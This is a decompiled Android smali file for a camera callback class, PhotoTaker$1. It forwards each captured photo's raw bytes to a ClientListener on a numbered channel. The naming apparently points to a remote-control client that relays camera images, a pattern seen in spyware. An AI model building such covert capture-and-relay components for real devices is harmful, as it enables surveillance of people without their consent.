.class Lmy/app/Library/PhotoTaker$1;
.super Ljava/lang/Object;
.source "PhotoTaker.java"

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lmy/app/Library/PhotoTaker;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lmy/app/Library/PhotoTaker;


# direct methods
.method constructor <init>(Lmy/app/Library/PhotoTaker;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 2
    .param p1, "data"    # [B
    .param p2, "camera"    # Landroid/hardware/Camera;

    .prologue
    .line 27
    iget-object v0, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    iget-object v0, v0, Lmy/app/Library/PhotoTaker;->ctx:Lmy/app/client/ClientListener;

    iget-object v1, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    iget v1, v1, Lmy/app/Library/PhotoTaker;->chan:I

    invoke-virtual {v0, v1, p1}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 28
    return-void
.end method
